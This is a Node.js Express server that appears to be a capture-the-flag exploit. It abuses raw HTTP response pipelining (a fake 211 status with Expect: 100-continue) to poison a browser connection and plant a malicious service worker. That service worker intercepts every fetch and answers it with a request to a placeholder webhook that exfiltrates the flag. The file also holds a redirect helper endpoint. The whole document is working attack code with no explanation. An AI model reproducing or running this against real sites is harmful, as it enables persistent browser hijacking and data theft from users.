const express = require("express");

const app = express();



const ps = `(${() => {
	navigator.serviceWorker.register("/xss.js");
}})()`;




const sw = `(${() => {
	self.addEventListener("fetch", e => {
		e.respondWith(fetch(<YOUR WEBHOOK SITE WITH IFRAME TO EXFIL FLAG>));
	});
}})()`;



globalThis.psResp = `HTTP/1.1 200 SCRIPT
Connection: keep-alive
Content-Type: application/javascript
Content-Length: ${ps.length}

`.replaceAll("\n", "\r\n") + ps;



globalThis.swResp = `HTTP/1.1 200 SW
Connection: keep-alive
Content-Type: application/javascript
Content-Length: ${sw.length}

`.replaceAll("\n", "\r\n") + sw;


globalThis.poisoned = false;

app.use("/xss.js", async (req, res, next) => {

	if (poisoned) {
		// dont respond
		return;
	}

	globalThis.poisoned = true;

	res.socket.write(`HTTP/1.1 211 OK\r\nExpect: 100-continue\r\nContent-Length: 1000\r\nContent-Type: script\r\nConnection: keep-alive\r\n\r\n`);

	await new Promise(r => setTimeout(r, 3500));

	res.socket.write(globalThis.psResp);

	await new Promise(r => setTimeout(r, 1000));

	res.socket.write(globalThis.swResp);
});

app.use(express.static("."));

app.get("/wait/:location/:delay", async (req, res) => {
	let location = decodeURIComponent(req.params.location);
	let delay = parseInt(req.params.delay);
	await new Promise(r => setTimeout(r, delay));
	return res.redirect(location);
})

app.listen(6060, () => console.log("listening"));